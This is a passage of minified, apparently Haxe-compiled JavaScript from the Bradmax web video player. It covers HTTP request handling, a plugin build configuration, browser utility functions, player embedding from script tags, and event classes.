Cb=1>=this.url.split("?").length;d.open("GET",this.url+(Cb?"?":"&")+(null==Aa?"null":p.string(Aa)),this.async),Aa=null}else d.open("GET",this.url,this.async);d.responseType="arraybuffer"}catch(Ub){return q=yb.caught(Ub).unwrap(),this.req=null,void this.onError(q.toString())}for(d.withCredentials=this.withCredentials,!M.exists(this.headers,(function(Ub){return"Content-Type"==Ub.name}))&&b&&null==this.postData&&d.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),X=0,ra=this.headers;X<ra.length;)b=ra[X],++X,d.setRequestHeader(b.name,b.value);d.send(Aa),this.async||q(null)},__class__:L});var G=function(b){L.call(this,b)};wa["bs.net.Http"]=G,G.__name__="bs.net.Http",G.__super__=L,G.prototype=Ja(L.prototype,{registerEvents:function(b){var c=this;b.onreadystatechange=function(){if(4==b.readyState){try{var d=b.status}catch(q){d=null}if(null==d&&(d=null),null!=d&&c.onStatus(d),null!=d&&200<=d&&400>d)c.onData(b.response);else if(null==d)c.onError("Failed to connect or resolve host");else switch(d){case 0:c.onError("Unable to make request (may be blocked due to cross-domain permissions)");break;case 12007:c.onError("Unknown host");break;case 12029:c.onError("Failed to connect to host");break;default:c.onError("Http Error #"+b.status)}}}},customRequest:function(b,c,d,q){b=new XMLHttpRequest,this.registerEvents(b),c="",d=0;for(var X=this.params;d<X.length;){var ra=X[d];++d,0!=c.length&&(c=p.string(c)+"&");var Aa=m.field(ra,"name");null==Aa&&(Aa=m.field(ra,"param")),Aa=encodeURIComponent(Aa),ra=encodeURIComponent(ra.value),c=p.string(c)+(Aa+"=")+ra}try{if("GET"==q&&null!=c&&""!=c){var Qa=1>=this.url.split("?").length;b.open(q,this.url+(Qa?"?":"&")+p.string(c),!0),c=""}else b.open(q,this.url,!0)}catch(Wa){return q=yb.caught(Wa).unwrap(),void this.onError(q.toString())}for(d=0,X=this.headers;d<X.length;)q=X[d],++d,null==(Aa=m.field(q,"header"))&&(Aa=m.field(q,"name")),b.setRequestHeader(Aa,q.value);b.send(c)},__class__:G});var N=function(){};wa["bs.player.composer.CompilerConfig"]=N,N.__name__="bs.player.composer.CompilerConfig";var w=function(){this.pluginsVideo=[],this.plugins=[],this.data=w.configuration=JSON.parse('{"builds":[{"name":"js","output":"bin/for_bradmax/bradmax_player.js","target":"js","arguments":["-D custom_js","-D dash","-main bs.player.composer.Embeder","-cp player/src","-cp node_modules/@bradmax/stats-common/src"]}],"dependencies":[{"name":"svg","version":"1.0.8","type":"haxelib"},{"name":"actuate","version":"1.8.3","type":"haxelib"},{"name":"promhx","version":"1.0.0","type":"haxelib"}],"variables":[],"plugins":[{"main":"bs.player.plugin.video.Video","name":"Video","source":"plugins/Video/src","config":{},"jsDependencies":[{"position":"before","includeOnce":true,"file":"assets/js/header.js"}]},{"main":"bs.player.plugin.video.videoPlayer.VideoHlsJs","name":"VideoHlsJs","source":"plugins/VideoHlsJs/src","config":{},"jsDependencies":[{"position":"before","includeOnce":true,"file":"assets/js/hls.min.js"}]},{"main":"bs.player.plugin.video.videoPlayer.VideoDashJs","name":"VideoDashJs","source":"plugins/VideoDashJs/src","config":{},"jsDependencies":[{"position":"before","includeOnce":true,"file":"assets/js/dash.all.wrapper.js"}]},{"main":"bs.player.plugin.skin.BasicSkin","name":"BasicSkin","source":"plugins/BasicSkin/src","config":{"style":"plugins/BasicSkin/themes/mole/style.json","logoXPosition":"left","advance":false,"logoAutohide":false,"resetColorScheme":"reset to skin default color scheme","skin":"mole","subtitles":null,"shareButtons":"","COLOR_PROGRESS_2":"#000000","layout":"plugins/BasicSkin/themes/mole/layout.xml","COLOR_PROGRESS_1":"#000000","logoYPosition":"top","logoLink":null,"COLOR_PROGRESS_0":"#aaaaaa","logoFile":null,"autoplay":false,"COLOR_CONTROLS_1":"#000000","COLOR_BASE_1":"#ffffff","branding":null,"startEndSplash":null,"showSkinOnInit":true,"audio":null,"videoCastEnabled":true,"COLOR_BASE_0":"#000000","pictureInPictureButtonVisible":true,"COLOR_TEXT":"#ffffff","logoLinkTarget":"_blank","skinAndColor":null,"volume":0.7,"COLORS_SHADE_MAP_BASE":"#000000","COLOR_CONTROLS_2":"#000000","COLOR_CONTROLS_0":"#000000","endSplash":"reload"},"jsDependencies":[]},{"main":"bs.player.plugin.playbackresume.PlaybackResume","name":"PlaybackResume","source":"plugins/PlaybackResume/src","config":{},"jsDependencies":[]},{"main":"bs.player.plugin.javascriptapi.JavascriptApi","name":"JavascriptApi","source":"plugins/JavascriptApi/src","config":{},"jsDependencies":[]},{"main":"bs.player.plugin.dataProvider.BradmaxDataProvider","name":"BradmaxDataProvider","source":"plugins/BradmaxDataProvider/src","config":{},"jsDependencies":[]},{"main":"bs.player.plugin.bradmax.analytics.BradmaxAnalytics","name":"BradmaxAnalytics","source":"plugins/BradmaxAnalytics/src","config":{"clientToken":"4zm4.zFqbOf1m4PzAqHmTfKbq4UwszEq4m9fEb"},"jsDependencies":[{"position":"before","includeOnce":true,"file":"assets/js/bradmax_analytics_bams.js"}]},{"main":"bs.player.plugin.stats.GoogleAnalytics","name":"GoogleAnalytics","source":"plugins/GoogleAnalytics/src","config":{},"jsDependencies":[]},{"main":"bs.player.plugin.stats.GemiusStream","name":"GemiusStream","source":"plugins/GemiusStream/src","config":{},"jsDependencies":[]}]}')};wa["bs.player.composer.Composer"]=w,w.__name__="bs.player.composer.Composer",w.main=function(){m.field(window,"bradmax").player.composer=w},w.prototype={data:null,parent:null,plugins:null,pluginsVideo:null,player:null,createPlayer:function(b,c,d){null==b&&(b="PLAYER"),La.getInstance(),w.classes="bs.player.plugin.video.Video bs.player.plugin.video.videoPlayer.VideoHlsJs bs.player.plugin.video.videoPlayer.VideoDashJs bs.player.plugin.skin.BasicSkin bs.player.plugin.playbackresume.PlaybackResume bs.player.plugin.javascriptapi.JavascriptApi bs.player.plugin.dataProvider.BradmaxDataProvider bs.player.plugin.bradmax.analytics.BradmaxAnalytics bs.player.plugin.stats.GoogleAnalytics bs.player.plugin.stats.GemiusStream".split(" ");for(var q=0,X=w.classes;q<X.length;){var ra=X[q];++q;var Aa=null;try{Aa=g.createInstance(wa[ra],[])}catch(Wa){var Qa=yb.caught(Wa).unwrap();console.log("player/src/bs/player/composer/Composer.hx:69:",Qa)}null!=Aa&&(fb.__implements(Aa,S)?this.pluginsVideo.push(Aa):(Aa.className=ra,Aa.uid=Aa.context=b,this.plugins.push(Aa)))}return this.player=new O,this.player.uid=b,this.player.configuration=w.configuration,this.player.plugins=this.plugins,this.player.pluginsVideo=this.pluginsVideo,this.player.initialize(this.getParent(c),this.getData(d)),this.player},getData:function(b){return null!=b?b:this.data},getParent:function(b){return null!=b?b:this.parent},__class__:w};var h=function(){};wa["bs.util.BrowserTools"]=h,h.__name__="bs.util.BrowserTools",h.getScreenSize=function(){var b=window.screen;return{width:0|(b.width>b.height?b.width:b.height),height:0|(b.width>b.width?b.height:b.width)}},h.isMobile=function(){return h.mobile},h.isSmartTV=function(){return h.smartTV},h.isWebView=function(){return null!=window.bradmaxSetFullscreen},h.getUserAgent=function(){return window.navigator.userAgent},h.getBrowserName=function(){return h.browserName},h.isBrowserOnline=function(){return window.navigator.onLine},h.isMediaSourceExtensionSupported=function(){return Object.prototype.hasOwnProperty.call(window,"MediaSource")},h.baseUrl=function(){var b=sb.location;return h.baseUrlCacheLastFullUrl!=b.href&&(h.baseUrlCacheLastFullUrl=b.href,h.baseUrlCacheLastBaseUrl=h.baseUrlCacheLastFullUrl.split(b.hash).join("")),h.baseUrlCacheLastBaseUrl},h.log=function(b){null==h.traceLog&&(h.traceLog="<h5>trace:</h5>"),h.traceLog+="<p>"+b+"</p>",h.printLog(),null==h.traceTrg&&window.addEventListener("load",h.printLog)},h.printLog=function(){null==h.traceTrg&&(h.traceTrg=window.document.getElementById("trace")),null!=h.traceTrg&&(h.traceTrg.innerHTML=h.traceLog)},h.highlightHtmlNode=function(b){var c=window.document.body;if(Object.prototype.hasOwnProperty.call(c,"createTextRange"))(c=c.createTextRange()).moveToElementText(b),c.select();else{var d=window.getSelection();(c=window.document.createRange()).selectNodeContents(b),d.removeAllRanges(),d.addRange(c)}},h.copyToClipboard=function(b){var c=window.document.createElement("input");c.style.fontSize="12pt",c.style.border="0",c.style.padding="0",c.style.margin="0",c.style.position="absolute","rtl"==window.document.documentElement.getAttribute("dir")?c.style.right="-9999px":c.style.left="-9999px";var d=window.pageYOffset;null==d&&(d=window.document.documentElement.scrollTop),c.addEventListener("focus",(function(X){window.scrollTo(0,d)})),c.style.top=d+"px",c.setAttribute("readonly",""),c.value=b,window.document.body.appendChild(c),c.focus(),c.setSelectionRange(0,c.value.length);try{var q=window.document.execCommand("copy")}catch(X){q=!1}return c.blur(),window.document.body.removeChild(c),q},h.findThisJsScriptAbsolutePath=function(b){var c=window.document.currentScript;if(null!=c)return c.src;var d=window.document.getElementsByTagName("script");return null==(c=h.findScriptBySrc(d,b))&&f.endsWith(b,"_")&&(c=h.findScriptBySrc(d,da.substr(b,0,-1))),null!=c?c.src:null},h.findScriptBySrc=function(b,c){for(var d,q=0;q<b.length;){var X=b[q];if(++q,null!=(d=X.getAttribute("src"))&&(d=(d=(d=(d=d.split("/").pop()).split(".min.js").join("")).split(".js.min").join("")).split(".js").join(""))==c)return X}return null},h.disableHtmlSelection=function(){h.disableHtmlSelectionFunction=function(b){return b.preventDefault(),!1},window.document.addEventListener("selectstart",h.disableHtmlSelectionFunction)},h.enableHtmlSelection=function(){null!=h.disableHtmlSelectionFunction&&(window.document.removeEventListener("selectstart",h.disableHtmlSelectionFunction),h.disableHtmlSelectionFunction=null)},h.canRequestVideoFrameCallback=function(){return"requestVideoFrameCallback"in HTMLVideoElement.prototype},h.isWebGLAvailable=function(){if(h.isWebView())return!1;try{var b=Object.prototype.hasOwnProperty.call(window,"WebGLRenderingContext"),c=window.document.createElement("canvas");if(!b)return b;var d=null!=c.getContext("webgl")||null!=c.getContext("experimental-webgl");return!!b&&d}catch(q){return!1}},h.isWebGL2Available=function(){if(h.isWebView())return!1;try{var b=Object.prototype.hasOwnProperty.call(window,"WebGL2RenderingContext"),c=window.document.createElement("canvas");if(!b)return b;var d=null!=c.getContext("webgl2");return!!b&&d}catch(q){return!1}},h.getOrientation=function(){if(null!=window.screen.orientation)return window.screen.orientation.angle;var b=window.orientation;return"number"==typeof b&&(0|b)===b?window.orientation:0},h.isDeviceOrientationSupported=function(){return Object.prototype.hasOwnProperty.call(window,"DeviceOrientationEvent")},h.connectDeviceOrientation=function(b,c){h.isDeviceOrientationSupported()&&(null!=DeviceOrientationEvent.requestPermission?DeviceOrientationEvent.requestPermission().then((function(d){"granted"==d&&window.addEventListener("deviceorientation",b,!1)})).catch(D.error):window.addEventListener("deviceorientation",b,!1))},h.disconnectDeviceOrientation=function(b){h.isDeviceOrientationSupported()&&window.removeEventListener("deviceorientation",b)},h.isVrSupported=function(){var b=sb.navigator;return null==b||null==(b=b.xr)?Promise.resolve(!1):b.isSessionSupported("immersive-vr")},h.requestVrSession=function(){var b=sb.navigator;return null==b||null==(b=b.xr)?Promise.resolve(null):b.requestSession("immersive-vr",{optionalFeatures:["local-floor","bounded-floor","hand-tracking","layers"]})};var F=function(){this.runDetectScripts()};wa["bs.player.composer.Embeder"]=F,F.__name__="bs.player.composer.Embeder",F.main=function(){null==F.expose.player.embeder&&(F.expose.player.embeder={},null==m.field(F.expose.player.embeder,"bradmax_player_v2.14.380")&&(F.expose.player.embeder["bradmax_player_v2.14.380"]=new F))},F.collectClickForLaterAutoplay=function(){if(F.lastCallForCollectClickForLaterAutoplay=new Date,!(2<=F.htmlVideoElementsForLaterAutoplay.length)){var b=window.document.createElement("video");b.controls=!1,b.setAttribute("src",F.VIDEO_SRC_FOR_COLLECT_AUTOPLAY),b.setAttribute(F.VIDEO_TAG_FOR_AUTOPLAY_INITIALSED,"1"),h.isiOS&&(b.setAttribute("playsinline",""),b.setAttribute("webkit-playsinline",""));var c=b.play();null!=c?(F.pendingVideoElementsForLaterAutoplay+=1,c.then((function(){b.pause(),F.htmlVideoElementsForLaterAutoplay.push(b),--F.pendingVideoElementsForLaterAutoplay;for(var d=0,q=F.listenersWaitinfForVideoElementForAutoplay;d<q.length;){var X=q[d];++d,X()}F.listenersWaitinfForVideoElementForAutoplay=[]}))):(b.pause(),F.htmlVideoElementsForLaterAutoplay.push(b))}},F.getLastCallForCollectClickForLaterAutoplay=function(){return F.lastCallForCollectClickForLaterAutoplay},F.getHtmlVideoReadyForAutoplay=function(){return 0==F.htmlVideoElementsForLaterAutoplay.length?null:F.htmlVideoElementsForLaterAutoplay.pop()},F.hasPendingVideoElementsForLaterAutoplay=function(){return 0<F.pendingVideoElementsForLaterAutoplay},F.hasHtmlVideoReadyForAutoplay=function(){return 0<F.htmlVideoElementsForLaterAutoplay.length},F.addListenerForVideoElementForAutoplay=function(b){F.listenersWaitinfForVideoElementForAutoplay.push(b)},F.prototype={runDetectScripts:function(){F.expose.player.list=U(this,this.listPlayers),F.expose.player.create=U(this,this.createPlayerInElement),F.expose.player.destroy=U(this,this.destroyPlayer),F.expose.player.getById=U(this,this.getPlayerById),F.expose.player.getVersion=U(this,this.getVersion),F.expose.player.collectClickForLaterAutoplay=F.collectClickForLaterAutoplay,this.detectScript(),this.detectScriptAttributes(),this.configDetectionScripts()},getVersion:function(){return"v2.14.380"},configDetectionScripts:function(){var b=window;null!=b&&Object.prototype.hasOwnProperty.call(b,"bradmax")&&(b=m.field(b,"bradmax"),Object.prototype.hasOwnProperty.call(b,"player")&&(b=m.field(b,"player"),Object.prototype.hasOwnProperty.call(b,"wrapper")&&m.field(b,"wrapper")))},initDetectionScripts:function(){for(var b=new ff,c=0,d=F.wrappers;c<d.length;){var q=d[c];++c,b.add(U(q,q.checkIframe)),q.embeder=this,q.detect()}b.init()},getPlayerById:function(b){return F.players.h[b]},destroyPlayer:function(b){if(null!=b){var c=b.uid,d=F.players;Object.prototype.hasOwnProperty.call(d.h,c)&&delete d.h[c],b.destroy(!0),null!=(c=window.document.getElementById("player_con_"+b.uid.split("_")[1]))&&fb.__cast(c.parentNode,HTMLDivElement).removeAttribute("data-bradmax-player-pid"),null!=(b=window.document.getElementById(b.uid))&&b.parentNode.removeChild(b),null!=c&&null!=c.remove&&c.remove()}},checkIfPlayerExistInElement:function(b){return!!b.hasAttribute("data-bradmax-player-pid")},getPlayerByElement:function(b){return b.hasAttribute("data-bradmax-player-pid")?(b="player_"+b.getAttribute("data-bradmax-player-pid"),F.players.h[b]):null},createPlayerInElement:function(b,c,d){return this.checkIfPlayerExistInElement(b)?this.getPlayerByElement(b):"string"==typeof c&&null==(c=xe.decode(c))?(console.error("PLAYER VARIABLE DATA INVALID"),null):this.createPlayer(b,c,null,"inside",d)},createPlayer:function(b,c,d,q,X){if(null==q&&(q="before"),null==d){var ra=Tc.UID_CHARS.length,Aa="";for(d=0;24>d;){var Qa=d++;switch(Qa="xxxx-xxxx-xxxx-xxxx-xxxx".charAt(Qa)){case"-":case"_":break;default:Qa=Tc.UID_CHARS.charAt(p.random(ra))}Aa+=Qa}d=Aa}switch(ra="player_"+d,this.setPID(b,d),(Aa=window.document.createElement("div")).setAttribute("id","player_con_"+d),Aa.style.display="block",Aa.style.position="relative",Aa.style.width="100%",Aa.style.height="100%",Aa.style.background="#000000",Aa.style.overflow="hidden",q){case"before":b.parentElement.insertBefore(Aa,b);break;case"inside":b.appendChild(Aa)}return(b=window.document.createElement("div")).setAttribute("id",ra),b.setAttribute("class","bsplayer"),b.style.display="block",b.style.position="relative",b.style.width="100%",b.style.height="100%",b.style.background="#000000",b.style.overflow="hidden",Aa.appendChild(b),this.appendPlayer(this.useHTML5(b,c,ra,X))},appendPlayer:function(b){if(F.players.h[b.uid]=b,window.hasOwnProperty("_ba_createPlayer")){var c=window._ba_createPlayer;if("function"==typeof c)try{c(b)}catch(d){}}return b},listPlayers:function(){for(var b=[],c=F.players.h,d=Object.keys(c),q=d.length,X=0;X<q;){var ra=c[d[X++]];b.push(ra)}return b},detectScriptAttributes:function(){for(var c,b=Tc.UID_CHARS.length,d=0;24>d;)switch(c=d++,c="xxxx-xxxx-xxxx-xxxx-xxxx".charAt(c),c){case"-":case"_":break;default:Tc.UID_CHARS.charAt(p.random(b))}var q=window.document.getElementsByTagName("script");for(b=[],d=0;d<q.length;)c=q[d],++d,b.push(c);var X=function(Cb){return!(null==(Cb=null!=Cb.innerText?f.trim(Cb.innerText):null)||!f.startsWith(Cb,"{"))&&f.endsWith(Cb,"}")};for(q=function(Cb){return!(!Cb.hasAttribute("data-bs-variables")&&!X(Cb)||!Cb.hasAttribute("data-bs-parent-id"))&&!Cb.hasAttribute("data-bradmax-player-pid")},d=0;d<b.length;)if(c=b[d],++d,q(c)){var ra={},Aa=null,Qa=c.getAttribute("data-bs-parent-id");try{if(Aa=window.document.getElementById(Qa),c.hasAttribute("data-bs-variables")&&(ra=xe.decode(c.getAttribute("data-bs-variables"))),(null==ra||0==m.fields(ra).length)&&null!=c.innerText&&X(c))try{ra=JSON.parse(c.innerText)}catch(Cb){var Wa=yb.caught(Cb).unwrap();console.error("INNER TEXT VARIABLE INVALID DATA"),console.error(Wa);break}if(null==ra){console.error("INLINE VARIABLE DATA INVALID");break}}catch(Cb){d=yb.caught(Cb).unwrap(),console.error("VARIABLE DATA INVALID"),console.error(d);break}if(null==Aa){console.error("ELEMENT ID NOT FOUND: "+Qa);break}this.createPlayer(Aa,ra,null,"inside")}},detectScript:function(){for(var c,b=Tc.UID_CHARS.length,d=0;24>d;)switch(c=d++,c="xxxx-xxxx-xxxx-xxxx-xxxx".charAt(c),c){case"-":case"_":break;default:Tc.UID_CHARS.charAt(p.random(b))}for(b=window.document.getElementsByTagName("script"),d=0;d<b.length;)if(c=b[d],++d,this.isEmptyPlayerScript(c)){var q={};try{q=JSON.parse(c.textContent)}catch(X){console.error("JSON DATA INVALID");break}this.createPlayer(c,q)}},isEmptyPlayerScript:function(b){return!(!b.hasAttribute("data-bigsoda-player")||b.hasAttribute("data-bradmax-player-pid"))},isMobile:function(){var b=window.navigator.userAgent,c=-1<b.indexOf("Android"),d=-1<b.indexOf("BlackBerry"),q=-1<b.indexOf("iPhone"),X=-1<b.indexOf("iPad"),ra=-1<b.indexOf("iPod"),Aa=-1<b.indexOf("Opera Mini");return b=-1<b.indexOf("IEMobile"),!!(c||d||q||X||ra||Aa)||b},useHTML5:function(b,c,d,q){var X=m.field(m.field(F.expose,"player"),"composers"),ra=m.fields(X);return q=m.field(X,null==q?ra[0]:q),g.createInstance(q,[]).createPlayer(d,b,c)},setPID:function(b,c){return b.hasAttribute("data-bradmax-player-pid")||b.setAttribute("data-bradmax-player-pid",c),b.getAttribute("data-bradmax-player-pid")},isPlayerBS:function(b){return b.hasAttribute("data-bigsoda-player")},__class__:F};var P=function(){for(var d,b=Tc.UID_CHARS.length,c="",q=0;24>q;){switch(d=q++,d="xxxx-xxxx-xxxx-xxxx-xxxx".charAt(d)){case"-":case"_":break;default:d=Tc.UID_CHARS.charAt(p.random(b))}c+=d}this.uid=c};wa["bs.player.core.Context"]=P,P.__name__="bs.player.core.Context",P.prototype={context:null,uid:null,__class__:P};var O=function(){this.modules={},this.pluginsVideo=[],this.plugins=[],this.eventHub=V.getInstance()};wa["bs.player.core.Player"]=O,O.__name__="bs.player.core.Player",O.prototype={uid:null,configuration:null,plugins:null,pluginsVideo:null,modules:null,api:null,parentDisplay:null,parent:null,data:null,eventHub:null,destroy:function(b){if(null==b&&(b=!1),b){try{ka.destroyMonitor(this.uid)}catch(X){b=yb.caught(X).unwrap(),console.error({msg:"Exception catched during destroying monitor.",exception:b})}for(var c=0,d=this.plugins;c<d.length;){var q=d[c];++c;try{q.destroy()}catch(X){b=yb.caught(X).unwrap(),console.error({msg:"Exception catched during destroying plugin.",plugin:q,exception:b})}}for(;0<this.plugins.length;)this.plugins.pop()}else window.bradmax.player.destroy(this)},activatePlugins:function(){for(var b=0,c=this.plugins;b<c.length;){var d=c[b];++b,d.context=d.uid=this.uid,d.set_configuration(this.configuration),d.set_player(this),this.eventHub.registerPlugin(d),d.set_parentDisplay(this.parent),d.set_variables(this.data),this.modules[d.getPluginName()]=d,"JavascriptApi"==d.getPluginName()&&(this.api=d)}for(b=0,c=this.plugins;b<c.length;)d=c[b],++b,d.create();for(b=0,c=this.plugins;b<c.length;)d=c[b],++b,d.activate();for(b=0,c=this.plugins;b<c.length;)d=c[b],++b,d.postActivate()},initialize:function(b,c){this.parent=b,this.data=c,ka.getMonitor(this.uid),this.activatePlugins()},loadPlugin:function(b){1==this.isInterface(b,ia,lb)&&this.plugins.push(b)},isInterface:function(b,c,d){if(fb.__instanceof(b,c))return!0;if(null==d)return!1;for(c=m.fields(g.createInstance(d,[])),d=0;d<c.length;){var q=c[d];if(++d,!Object.prototype.hasOwnProperty.call(b,q))return!1}return!0},__class__:O};var R=function(b){this.className="bs.player.core.events.BaseEvent",this.type=b};wa["bs.player.core.events.BaseEvent"]=R,R.__name__="bs.player.core.events.BaseEvent",R.add=function(b,c,d){V.getInstance().add(b,R.staticClassName,c,d)},R.addOnce=function(b,c,d){V.getInstance().addOnce(b,R.staticClassName,c,d)},R.remove=function(b,c,d){V.getInstance().remove(b,R.staticClassName,c,d)},R.disable=function(b,c){V.getInstance().disable(b,R.staticClassName,c)},R.enable=function(b,c){V.getInstance().enable(b,R.staticClassName,c)},R.filter=function(b){},R.prototype={className:null,type:null,data:null,dispatch:function(b){V.getInstance().dispatch(b,R.staticClassName,this.type,this)},__class__:R};var Q=function(b){R.call(this,b),this.className=Q.staticClassName};wa["bs.player.core.events.AdEvent"]=Q,Q.__name__="bs.player.core.events.AdEvent",Q.addOnce=function(b,c,d){V.getInstance().addOnce(b,Q.staticClassName,c,d)},Q.add=function(b,c,d){V.getInstance().add(b,Q.staticClassName,c,d)},Q.remove=function(b,c,d){V.getInstance().remove(b,Q.staticClassName,c,d)},Q.disable=function(b,c){V.getInstance().disable(b,Q.staticClassName,c)},Q.enable=function(b,c){V.getInstance().enable(b,Q.staticClassName,c)},Q.__super__=R,Q.prototype=Ja(R.prototype,{dispatch:function(b){V.getInstance().dispatch(b,Q.staticClassName,this.type,this)},__class__:Q});var ja=function(b){R.call(this,b),this.className=ja.staticClassName};wa["bs.player.core.events.ChromecastEvent"]=ja,ja.__name__="bs.player.core.events.ChromecastEvent",ja.addOnce=function(b,c,d){V.getInstance().addOnce(b,ja.staticClassName,c,d)},ja.add=function(b,c,d){V.getInstance().add(b,ja.staticClassName,c,d)},ja.remove=function(b,c,d){V.getInstance().remove(b,ja.staticClassName,c,d)},ja.disable=function(b,c){V.getInstance().disable(b,ja.staticClassName,c)},ja.enable=function(b,c){V.getInstance().enable(b,ja.staticClassName,c)},ja.__super__=R,ja.prototype=Ja(R.prototype,{dispatch:function(b){V.getInstance().dispatch(b,ja.staticClassName,this.type,this)},__class__:ja});var W=function(b){R.call(this,b),this.className=W.staticClassName};wa["bs.player.core.events.ControlEvent"]=W,W.__name__="bs.player.core.events.ControlEvent",W.add=function(b,c,d){V.getInstance().add(b,W.staticClassName,c,d)},W.addOnce=function(b,c,d){V.getInstance().addOnce(b,W.staticClassName,c,d)},W.remove=function(b,c,d){V.getInstance().remove(b,W.staticClassName,c,d)},W.disable=function(b,c){V.getInstance().disable(b,W.staticClassName,c)},W.enable=function(b,c){V.getInstance().enable(b,W.staticClassName,c)},W.filter=function(b){},W.__super__=R,W.prototype=Ja(R.prototype,{dispatch:function(b){V.getInstance().dispatch(b,W.staticClassName,this.type,this)},__class__:W});var aa=function(b){R.call(this,b),this.className=aa.staticClassName};wa["bs.player.core.events.DataProviderEvent"]=aa,aa.__name__="bs.player.core.events.DataProviderEvent",aa.addOnce=function(b,c,d){V.getInstance().addOnce(b,aa.staticClassName,c,d)},aa.add=function(b,c,d){V.getInstance().add(b,aa.staticClassName,c,d)},aa.remove=function(b,c,d){V.getInstance().remove(b,aa.staticClassName,c,d)},aa.disable=function(b,c){V.getInstance().disable(b,aa.staticClassName,c)},aa.enable=function(b,c){V.getInstance().enable(b,aa.staticClassName,c)},aa.filter=function(b){},aa.__super__=R,aa.prototype=Ja(R.prototype,{dispatch:function(b){V.getInstance().dispatch(b,aa.staticClassName,this.type,this)},__class__:aa});var ma=function(b){R.call(this,b),this.className=ma.staticClassName};wa["bs.player.core.events.DisplayEvent"]=ma,ma.__name__="bs.player.core.events.DisplayEvent",ma.addOnce=function(b,c,d){V.getInstance().addOnce(b,ma.staticClassName,c,d)},ma.add=function(b,c,d){V.getInstance().add(b,ma.staticClassName,c,d)},ma.remove=function(b,c,d){V.getInstance().remove(b,ma.staticClassName,c,d)},ma.disable=function(b,c){V.getInstance().disable(b,ma.staticClassName,c)},ma.enable=function(b,c){V.getInstance().enable(b,ma.staticClassName,c)},ma.__super__=R,ma.prototype=Ja(R.prototype,{dispatch:function(b){V.getInstance().dispatch(b,ma.staticClassName,this.type,this)},__class__:ma});var H=function(b){R.call(this,b),this.className=H.staticClassName};wa["bs.player.core.events.EditEvent"]=H,H.__name__="bs.player.core.events.EditEvent",H.addOnce=function(b,c,d){V.getInstance().addOnce(b,H.staticClassName,c,d)},H.add=function(b,c,d){V.getInstance().add(b,H.staticClassName,c,d)},H.remove=function(b,c,d){V.getInstance().remove(b,H.staticClassName,c,d)},H.disable=function(b,c){V.getInstance().disable(b,H.staticClassName,c)},H.enable=function(b,c){V.getInstance().enable(b,H.staticClassName,c)},H.__super__=R,H.prototype=Ja(R.prototype,{dispatch:function(b){V.getInstance().dispatch(b,H.staticClassName,this.type,this)},__class__:H});var B=function(b){R.call(this,b),this.className=B.staticClassName};wa["bs.player.core.events.ErrorEvent"]=B,B.__name__="bs.player.core.events.ErrorEvent",B.add=function(b,c,d){V.getInstance().add(b,B.staticClassName,c,d)},B.disable=function(b,c){V.getInstance().disable(b,B.staticClassName,c)},B.enable=function(b,c){V.getInstance().enable(b,B.staticClassName,c)},B.filter=function(b){},B.__super__=R,B.prototype=Ja(R.prototype,{message:null,dispatch:function(b){V.getInstance().dispatch(b,B.staticClassName,this.type,this)},__class__:B});var A=function(){};wa["bs.player.core.events.NativeEvent"]=A,A.__name__="bs.player.core.events.NativeEvent",A.__properties__={get_FULLSCREEN_CHANGE:"get_FULLSCREEN_CHANGE"},A.get_FULLSCREEN_CHANGE=function(){return A.fullscreenEventName},A.prototype={currentTarget:null,target:null,type:null,mouseX:null,mouseY:null,wheelDelta:null,platformEvent:null,setPlatformEvent:function(b){this.platformEvent=b},stopPropagation:function(){null!=this.platformEvent.stopPropagation?(this.platformEvent.stopPropagation(),this.platformEvent.preventDefault()):this.platformEvent.cancelBubble=!0},__class__:A};var Y=function(){this.browser=null,P.call(this),this.listeners=new Jb};wa["bs.player.core.events.NativeEventDispatcher"]=Y,Y.__name__="bs.player.core.events.NativeEventDispatcher",Y.__super__=P,Y.prototype=Ja(P.prototype,{browser:null,listeners:null,eventElement:null,addEventListener:function(b,c,d,q,X){null==X&&(X=!1),null==q&&(q=0),null==d&&(d=!1),Object.prototype.hasOwnProperty.call(this.listeners.h,b)||(this.listeners.h[b]=[]),d=function(ra){var Aa=new A;if(Aa.type=b,Aa.setPlatformEvent(ra),Aa.target=ra.target,Aa.currentTarget=ra.currentTarget,null!=ra.clientX&&null!=ra.clientY){var Qa=ra.currentTarget.getBoundingClientRect();Aa.mouseX=ra.clientX-Qa.left,Aa.mouseY=ra.clientY-Qa.top}else null!=ra.touches&&0<ra.touches.length&&null!=ra.touches[0]&&null!=ra.touches[0].clientX&&null!=ra.touches[0].clientY?(Qa=ra.currentTarget.getBoundingClientRect(),Aa.mouseX=ra.touches[0].clientX-Qa.left,Aa.mouseY=ra.touches[0].clientY-Qa.top):null!=ra.layerX&&null!=ra.layerY&&(Aa.mouseX=ra.layerX-ra.target.offsetLeft,Aa.mouseY=ra.layerY-ra.target.offsetTop);Aa.wheelDelta=ra.wheelDelta,c(Aa)},this.listeners.h[b].push({listener:c,wrapper:d}),this.attachEventListener(b,d)},createEventFunction:function(b,c){return function(d){var q=new A;if(q.type=b,q.setPlatformEvent(d),q.target=d.target,q.currentTarget=d.currentTarget,null!=d.clientX&&null!=d.clientY){var X=d.currentTarget.getBoundingClientRect();q.mouseX=d.clientX-X.left,q.mouseY=d.clientY-X.top}else null!=d.touches&&0<d.touches.length&&null!=d.touches[0]&&null!=d.touches[0].clientX&&null!=d.touches[0].clientY?(X=d.currentTarget.getBoundingClientRect(),q.mouseX=d.touches[0].clientX-X.left,q.mouseY=d.touches[0].clientY-X.top):null!=d.layerX&&null!=d.layerY&&(q.mouseX=d.layerX-d.target.offsetLeft,q.mouseY=d.layerY-d.target.offsetTop);q.wheelDelta=d.wheelDelta,c(q)}},setEventAttributes:function(b,c){if(b.target=c.target,b.currentTarget=c.currentTarget,null!=c.clientX&&null!=c.clientY){var d=c.currentTarget.getBoundingClientRect();b.mouseX=c.clientX-d.left,b.mouseY=c.clientY-d.top}else null!=c.touches&&0<c.touches.length&&null!=c.touches[0]&&null!=c.touches[0].clientX&&null!=c.touches[0].clientY?(d=c.currentTarget.getBoundingClientRect(),b.mouseX=c.touches[0].clientX-d.left,b.mouseY=c.touches[0].clientY-d.top):null!=c.layerX&&null!=c.layerY&&(b.mouseX=c.layerX-c.target.offsetLeft,b.mouseY=c.layerY-c.target.offsetTop);b.wheelDelta=c.wheelDelta},dispatchEvent:function(b){return null!=this.eventElement&&(this.eventElement.dispatchEvent(b),!0)},hasEventListener:function(b){return Object.prototype.hasOwnProperty.call(this.listeners.h,b)},removeEventListener:function(b,c,d){if(d=null,Object.prototype.hasOwnProperty.call(this.listeners.h,b)){for(var 